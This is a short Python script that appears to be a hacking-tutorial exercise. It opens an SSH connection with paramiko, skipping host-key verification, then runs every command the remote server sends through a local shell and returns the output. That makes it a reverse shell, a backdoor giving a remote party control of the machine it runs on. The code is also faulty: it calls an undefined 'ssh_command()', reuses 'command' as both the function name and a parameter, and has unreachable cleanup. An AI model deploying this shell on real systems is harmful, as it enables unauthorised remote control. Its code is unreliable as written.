import threading
import paramiko
import subprocess

def command(ip, uname, passwd, command):
    client = paramiko.SSHClient()
    # use the SSH_key
    # client.load_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=uname, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        #read banner
        print(ssh_session.recv(1024))
        while True:
            #get the command from the SSH server
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))

        client.close()
    return
ssh_command()
